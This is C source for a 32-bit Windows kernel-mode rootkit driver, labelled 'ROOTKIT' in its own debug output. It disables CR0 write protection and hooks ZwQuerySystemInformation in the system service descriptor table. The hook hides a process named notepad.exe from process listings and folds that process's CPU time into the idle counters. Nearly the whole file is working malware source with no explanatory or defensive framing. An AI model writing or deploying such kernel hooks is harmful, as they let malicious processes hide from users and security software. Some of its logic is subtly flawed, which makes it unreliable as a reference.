#include "ntddk.h"
#include <stdio.h>
#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
	char TestBuf[50];
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ SYSCALL_INDEX(_function)]

/*MDL
PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
*/
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
       _Orig = (PVOID) InterlockedExchange( (PLONG) &KeServiceDescriptorTable.ServiceTableBase[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange( (PLONG) &KeServiceDescriptorTable.ServiceTableBase[SYSCALL_INDEX(_Function)], (LONG) _Orig)
//MDL:  KeServiceDescriptorTable -> MappedSystemCallTable
//#define TARGET_PROCESS L"notepad.exe"
#pragma warning(disable: 4213)
#pragma warning(disable: 4054)
#pragma warning(disable: 4152)

struct _SYSTEM_THREADS
{
	LARGE_INTEGER           KernelTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           CreateTime;
	ULONG                           WaitTime;
	PVOID                           StartAddress;
	CLIENT_ID                       ClientIs;
	KPRIORITY                       Priority;
	KPRIORITY                       BasePriority;
	ULONG                           ContextSwitchCount;
	ULONG                           ThreadState;
	KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG                           NextEntryDelta;
	ULONG                           ThreadCount;
	ULONG                           Reserved[6];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ProcessName;
	KPRIORITY                       BasePriority;
	ULONG                           ProcessId;
	ULONG                           InheritedFromProcessId;
	ULONG                           HandleCount;
	ULONG                           Reserved2[2];
	VM_COUNTERS                     VmCounters;
	IO_COUNTERS                     IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS          Threads[1];
};

struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER					IdleTime;
	LARGE_INTEGER					KernelTime;
	LARGE_INTEGER					UserTime;
	LARGE_INTEGER					DpcTime;
	LARGE_INTEGER					InterruptTime;
	ULONG							InterruptCount;
};


NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength);


typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(
	ULONG SystemInformationCLass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;

LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;
NTSTATUS NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength)
{

	NTSTATUS ntStatus;
	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	DbgPrintEx(DPFLTR_ACPI_ID, 0, "Call Hookfunction");
	if (NT_SUCCESS(ntStatus))
	{
		if (SystemInformationClass == 5)
		{

			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;


			while (curr)
			{

				if (curr->ProcessName.Buffer != NULL)
				{
					if (0 == memcmp(curr->ProcessName.Buffer, L"notepad.exe", sizeof(curr->ProcessName)))
					{
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

						if (prev) 
						{
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							else
								prev->NextEntryDelta = 0;
						}
						else
						{
							if (curr->NextEntryDelta)
							{
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else
								SystemInformation = NULL;
						}
					}
				}
				else 
				{
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}
				prev = curr;
				if (curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}
		}
		else if (SystemInformationClass == 8)
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
		}

	}
	return ntStatus;
}

VOID WP_OFF()
{
	__asm {
		push eax
		mov eax, CR0
		and eax, 0x0FFFEFFFF
		mov CR0, eax
		pop eax
	}
}

VOID WP_ON()
{
	__asm {
		push eax
		mov eax, CR0
		or eax, NOT 0x0FFFEFFFF
		mov CR0, eax
		pop eax
	}
}

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("ROOTKIT: OnUnload called\n");
	UNREFERENCED_PARAMETER(DriverObject);

	// unhook system calls
	WP_OFF();
	UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);
	WP_ON();
	/*MDL
	// Unlock and Free MDL
	if (g_pmdlSystemCall)
	{
	MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
	IoFreeMdl(g_pmdlSystemCall);
	}
	*/
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
	IN PUNICODE_STRING theRegistryPath)
{
	char buf[100] = { 0 };

	UNREFERENCED_PARAMETER(theRegistryPath);

	theDriverObject->DriverUnload = OnUnload;


	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
	/*
	g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4);
	if (!g_pmdlSystemCall)
	return STATUS_UNSUCCESSFUL;

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	*/
	WP_OFF();

	DbgPrintEx(DPFLTR_ACPI_ID, 0, "Driver loading");

	// hook system calls
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);

	sprintf(buf, "index:%d\n", SYSCALL_INDEX(ZwQuerySystemInformation));
	DbgPrintEx(DPFLTR_ACPI_ID, 0, buf);
	WP_ON();
	return STATUS_SUCCESS;
}
